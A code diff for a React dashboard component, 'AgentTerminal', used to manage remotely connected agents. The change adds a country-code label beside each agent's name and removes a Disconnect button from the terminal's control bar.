@@ -138,14 +138,13 @@ export default function AgentTerminal({ agent, onClose }: Props) {
   return (
     <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 8 }}>
-        <div style={{ color: '#9efc9e' }}>Terminal: {agent.name} {interactive && <span style={{ color:'#ffb347', fontSize:12, marginLeft:8 }}>(interactive)</span>}</div>
+        <div style={{ color: '#9efc9e' }}>Terminal: {agent.name} {(agent as any).country_code ? (<span style={{ color: '#9efc9e', fontSize: 12 }}>({(agent as any).country_code})</span>) : null} {interactive && <span style={{ color:'#ffb347', fontSize:12, marginLeft:8 }}>(interactive)</span>}</div>
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
           <span style={{ color: '#9efc9e', fontSize: 12 }}>Path: <span style={{ color: '#ddd' }}>{currentDir || '(loading...)'}</span></span>
           <button className="btn secondary" onClick={cdUp}>Up</button>
           <button className="btn secondary" onClick={refreshStats}>Refresh</button>
           <button className="btn secondary" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
-          <button className="btn secondary" onClick={() => { if (confirm('Disconnect this agent from master now?')) { dashboardSocket.disconnect(agent.agent_id); setLines((prev) => [...prev, '[Disconnect requested]']); } }}>Disconnect</button>
           <button className="btn" onClick={triggerUpload} disabled={uploading}>{uploading ? 'Uploading...' : 'Upload'}</button>
           <input ref={uploadRef} type="file" style={{ display: 'none' }} onChange={onUpload} />
           <input className="input" placeholder="Interactive command (e.g., python game.py)" value={icmd} onChange={(e) => setIcmd(e.target.value)} style={{ width: 260 }} />
